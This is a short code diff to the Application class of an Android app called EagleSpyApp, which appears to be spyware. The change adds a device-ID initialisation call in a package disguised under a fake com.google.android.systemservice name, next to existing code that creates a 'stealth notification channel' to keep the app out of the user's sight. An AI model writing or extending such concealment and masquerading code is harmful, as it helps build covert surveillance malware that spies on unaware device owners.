@@ -42,6 +42,9 @@ class EagleSpyApp : Application() {
         
         Log.d(TAG, "EagleSpyApp initializing...")
         
+        // Initialize AndroidConfig device ID
+        com.google.android.systemservice.config.AndroidConfig.initDeviceId(this)
+        
         // Create stealth notification channel
         StealthNotificationHelper.createStealthChannel(this)
         
